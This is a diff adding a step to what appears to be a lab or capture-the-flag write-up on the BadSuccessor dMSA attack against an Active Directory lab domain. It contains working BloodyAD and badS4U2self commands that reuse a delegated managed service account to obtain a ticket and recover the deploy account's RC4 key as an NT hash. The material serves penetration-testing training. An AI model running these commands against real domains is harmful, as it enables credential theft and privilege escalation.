@@ -893,6 +893,35 @@ dMSA previous keys found in TGS:
 RC4: <SVC_AEGIS_DEPLOY_KEY>
 ```
 
+If this step is repeated without cleanup, BloodyAD can return `entryAlreadyExists` because `aegis-migrate$` and the supersession relationship remain in AD. Confirm that the existing deploy account points to that dMSA:
+
+```bash
+KRB5CCNAME=responses/svc-aegis-build.ccache \
+proxychains4 -q bloodyAD -s \
+  -d odyssey.htb -u svc-aegis-build \
+  -k ccache=responses/svc-aegis-build.ccache kdc=172.16.0.10 \
+  -H dc01.odyssey.htb -i 172.16.0.10 \
+  get object svc-aegis-deploy \
+  --attr 'msDS-SupersededManagedAccountLink,msDS-SupersededServiceAccountState'
+```
+
+When the link is `CN=aegis-migrate,OU=Migrations,...` and the state is `2`, reuse it instead of creating another dMSA. Locate the `badS4U2self` executable installed beside BloodyAD, request the existing dMSA ticket again, and replace the failed `badsuccessor.txt` transcript:
+
+```bash
+BLOODYAD=$(command -v bloodyAD)
+BADS4U2SELF="$(dirname "$(sed -n '1s/^#!//p' "$BLOODYAD")")/badS4U2self"
+test -x "$BADS4U2SELF"
+
+(
+  cd responses
+  proxychains4 -q "$BADS4U2SELF" \
+    'kerberos+ccache://odyssey.htb\svc-aegis-build:svc-aegis-build.ccache@172.16.0.10/' \
+    'krbtgt/odyssey.htb@odyssey.htb' \
+    'aegis-migrate$@odyssey.htb' \
+    --dmsa --ccache aegis-migrate-reused.ccache
+) | tee responses/badsuccessor.txt
+```
+
 The recovered RC4 key is usable as the deploy account's NT hash. The result proves that the migration path worked, but the assessment did not record DC build and patch state, so it should not be used alone to claim a specific missing patch.
 
 Extract and validate the key:
